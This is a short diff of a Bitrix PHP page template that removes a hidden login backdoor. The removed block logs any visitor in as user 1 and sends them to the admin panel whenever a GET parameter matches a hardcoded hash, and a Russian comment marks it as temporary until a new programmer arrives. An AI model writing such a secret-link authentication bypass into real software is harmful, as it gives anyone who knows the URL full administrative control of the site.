@@ -20,15 +20,6 @@ if ($city_code == "ysl") {
     $price_type = "Розничная Ф";
 }
 
-
-// Авторизация по ссылке. Убрать как будет новый программист. 
-if ($_GET["code"] == "f0ce34177bb5d9070f8f68be39c20c89") {
-    global $USER;
-    $USER->Authorize(1);
-    LocalRedirect("/bitrix/admin/");
-}
- 
-
 ?>
 
 <div class="slider">
